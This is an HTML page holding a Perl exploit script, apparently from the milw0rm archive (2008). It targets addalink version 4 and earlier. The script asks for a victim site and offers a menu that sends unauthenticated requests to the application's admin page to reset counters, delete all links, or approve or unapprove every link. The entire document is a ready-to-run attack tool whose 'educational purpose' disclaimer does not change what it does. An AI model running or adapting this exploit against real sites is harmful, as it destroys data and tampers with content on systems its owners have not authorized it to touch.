<html><head><title>addalink <= 4 Arbitrary Admin Access Vulnerability Exploit</title></head><pre># addalink &lt;= 4 Arbitrary Admin Access Vulnerability Exploit
# url: http://sourceforge.net/projects/addalink/
#
# Author: JosS
# mail: sys-project[at]hotmail[dot]com
# site: http://spanish-hackers.com
# team: Spanish Hackers Team - [SHT]
#
# This was written for educational purpose. Use it at your own risk.
# Author will be not responsible for any damage.
#
# Greetz To: All Hackers and milw0rm website

#!/usr/bin/perl

use HTTP::Request;
use LWP::UserAgent;

print &quot;Insert host/path:(ex: http://www.site.com/linkliste/)\n&quot;;
$host=&lt;STDIN&gt;;
chomp $host;
print &quot;\n&quot;;

# Si la url no tiene http: al principio
  if ( $host   !~   /^http:/ ) {

    # lo añadimos
    $host = 'http://' . $host;
}

# Si la url no tiene / al final
  if ( $host   !~   /\/$/ ) {

    # lo añadimos
    $host = $host . '/';
}

print &quot; Victim: $host \n\n&quot;;

menu:;



print &quot;Menu:\n&quot;;

print &quot;\n&quot;;



print &quot;1.  Reset all counters\n&quot;;

print &quot;2.  Delete all links\n&quot;;

print &quot;3.  Approve all links\n&quot;;

print &quot;4.  Unapprove all links\n&quot;;
print &quot;&quot;;
print &quot;5.  Exit\n\n&quot;;

print &quot;Option:&quot;;

$opcion=&lt;STDIN&gt;;



if ($opcion&gt;=1 &amp;&amp; $opcion&lt;=5 ) 

{



if ($opcion==1)

{

&amp;Reset_all_counters

}

if ($opcion==2)

{

&amp;Delete_all_links

}

if ($opcion==3)

{

&amp;Approve_all_links

}

if ($opcion==4)

{

&amp;Unapprove_all_links

}

if ($opcion==5)

{

exit(1);

}}

else
{
print &quot;Option incorrect\n&quot;;

goto menu;
}

####

sub Reset_all_counters
{

$poc=&quot;admin/read_links.php?action=resetcounter&quot;;

$final=&quot;$host$poc&quot;;
my $req=HTTP::Request-&gt;new(GET=&gt;$final);
my $ua=LWP::UserAgent-&gt;new();
$ua-&gt;timeout(30);
my $response=$ua-&gt;request($req);

print &quot;\n$final\n&quot;;

if ($response-&gt;is_success) {
print &quot;[+] Reset all counters\n\n&quot;;
}
else {
print &quot;[-] Reset all counters\n\n&quot;;
}

print &quot;\n&quot;;

print &quot;Press enter to go to menu.&quot;;

$volver=&lt;STDIN&gt;;

goto menu;

}

###

sub Delete_all_links
{

$poc=&quot;admin/read_links.php?action=deleteall&quot;;

$final=&quot;$host$poc&quot;;
my $req=HTTP::Request-&gt;new(GET=&gt;$final);
my $ua=LWP::UserAgent-&gt;new();
$ua-&gt;timeout(30);
my $response=$ua-&gt;request($req);

print &quot;\n$final\n&quot;;

if ($response-&gt;is_success) {
print &quot;[+] Delete all links\n\n&quot;;
}
else {
print &quot;[-] Delete all links\n\n&quot;;
}

print &quot;\n&quot;;

print &quot;Press enter to go to menu.&quot;;

$volver=&lt;STDIN&gt;;

goto menu;

}

###

sub Approve_all_links
{

$poc=&quot;admin/read_links.php?action=approveall&quot;;

$final=&quot;$host$poc&quot;;
my $req=HTTP::Request-&gt;new(GET=&gt;$final);
my $ua=LWP::UserAgent-&gt;new();
$ua-&gt;timeout(30);
my $response=$ua-&gt;request($req);

print &quot;\n$final\n&quot;;

if ($response-&gt;is_success) {
print &quot;[+] Approve all links\n\n&quot;;
}
else {
print &quot;[-] Approve all links\n\n&quot;;
}

print &quot;\n&quot;;

print &quot;Press enter to go to menu.&quot;;

$volver=&lt;STDIN&gt;;

goto menu;

}

###

sub Unapprove_all_links
{

$poc=&quot;admin/read_links.php?action=unapproveall&quot;;

$final=&quot;$host$poc&quot;;
my $req=HTTP::Request-&gt;new(GET=&gt;$final);
my $ua=LWP::UserAgent-&gt;new();
$ua-&gt;timeout(30);
my $response=$ua-&gt;request($req);

print &quot;\n$final\n&quot;;

if ($response-&gt;is_success) {
print &quot;[+] Unapprove all links\n\n&quot;;
}
else {
print &quot;[-] Unapprove all links\n\n&quot;;
}

print &quot;\n&quot;;

print &quot;Press enter to go to menu.&quot;;

$volver=&lt;STDIN&gt;;

goto menu;

}

# __EOF__

# milw0rm.com [2008-09-18]</pre></html>